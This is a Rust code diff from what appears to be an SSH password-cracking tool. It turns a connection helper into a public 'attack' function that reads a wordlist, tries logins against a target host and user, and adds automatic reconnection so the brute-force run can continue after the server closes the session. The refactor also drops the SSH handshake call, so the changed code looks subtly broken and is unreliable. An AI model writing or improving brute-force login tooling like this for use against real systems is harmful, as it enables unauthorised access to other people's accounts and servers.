@@ -24,18 +24,21 @@ impl From<&ssh2::Error> for SessionError {
     }
 }
 
-pub fn ssh_socket(addr: String, port: u16, user: String, wordlist_path: PathBuf, config: library::Config) -> Result<bool, Error> {
-    let mut cracked = false;
-
+fn ssh_socket(addr: &String, port: &u16) -> ssh2::Session {
     // Connect to the local SSH server
     let a: IpAddr = addr.parse().expect("parse failed");
     let socket = SocketAddr::from((a, port)); 
-    let tcp = TcpStream::connect(socket).unwrap();
     let mut session = ssh2::Session::new().unwrap();
+    let tcp = TcpStream::connect(socket).unwrap();
     session.set_tcp_stream(tcp);
-    session.handshake().unwrap();
+    session
+}
 
-    println!("Connected to {user}@{addr}:{port}");
+pub fn attack(addr: String, port: u16, user: String, wordlist_path: PathBuf, config: library::Config) {
+    let mut cracked = false;
+
+    let mut session = ssh_socket(&addr, &port);
+    println!("Connected");
 
     let string_wordlist = std::fs::read_to_string(wordlist_path).unwrap();
 
@@ -53,6 +56,7 @@ pub fn ssh_socket(addr: String, port: u16, user: String, wordlist_path: PathBuf,
                 match SessionError::from(&err) {
                     SessionError::Closed => {
                         eprintln!("Error: {}", err);
+                        session = ssh_socket(&addr, &port);
                         // attempt to reconnect to the server
                         // resume from point in wordlist
                     }
@@ -70,6 +74,5 @@ pub fn ssh_socket(addr: String, port: u16, user: String, wordlist_path: PathBuf,
             
         }
 
-    Ok(cracked)
 }
 
